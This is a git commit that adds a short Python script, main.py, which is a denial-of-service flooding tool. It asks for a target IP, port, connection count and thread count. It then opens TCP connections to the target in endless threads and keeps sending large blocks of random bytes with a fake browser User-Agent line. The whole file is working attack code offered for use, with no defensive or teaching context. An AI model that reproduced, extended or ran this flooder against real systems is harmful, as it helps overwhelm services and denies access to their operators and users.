a4303c76294ea2ab1bd312245b48ca8e149f82c8
Lamp <90402655+Lamp1337@users.noreply.github.com>
2021-10-15 20:49:04 -0700

    Coded in Python 3.x

---
+++ main.py
@@ -0,0 +1,36 @@
+import random, socket, threading
+
+useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"]
+
+ip = str(input("Target IP : "))
+port = int(input("Target Port : "))
+times = int(input("Connection/s : "))
+threads = int(input("Threads : "))
+
+def run():
+    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+    data = random._urandom(65812)
+    get_host = "https://github.com/Lamp1337 ~ Lamp#1442"
+    request = useragent + get_host + '\r\n'
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            s.send(str.encode(request))
+            for x in range(times):
+                s.send(data)
+                s.send(str.encode(request))
+        except :
+            s.close()
+
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start()
